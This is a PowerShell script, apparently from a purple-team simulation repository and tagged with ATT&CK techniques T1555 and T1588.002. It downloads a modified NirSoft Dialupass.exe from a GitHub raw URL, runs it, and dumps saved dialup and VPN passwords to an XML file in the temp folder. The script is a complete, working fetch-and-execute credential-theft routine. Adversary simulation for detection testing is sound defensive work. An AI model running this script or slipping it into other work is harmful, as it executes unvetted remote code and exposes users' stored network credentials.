<#
    T1588.002 - Obtain Capabilities: Tool
    T1555 - Credentials from Password Stores
    T1555.004 - Credentials from Password Stores: Windows Credential Manager
    Extract dialup/VPN passwords from windows with Nirsoft tool Dialupass.exe
    Download Dialupass.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/Dialupass.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

# Download and execute Dialupass.exe (the binary on my repo is accepting commandline, the default available on Nirsoft site does not)
$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/Dialupass.exe"
$dumpfile = "$env:tmp\dialupasswords.xml"
$outfile = "$env:tmp\dialupwd.exe"

try {
    Invoke-WebRequest $url -OutFile $outfile  -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: Dialupass.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download Dialupass.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: dialup/VPN passwords extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to extract dialup/VPN passwords to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
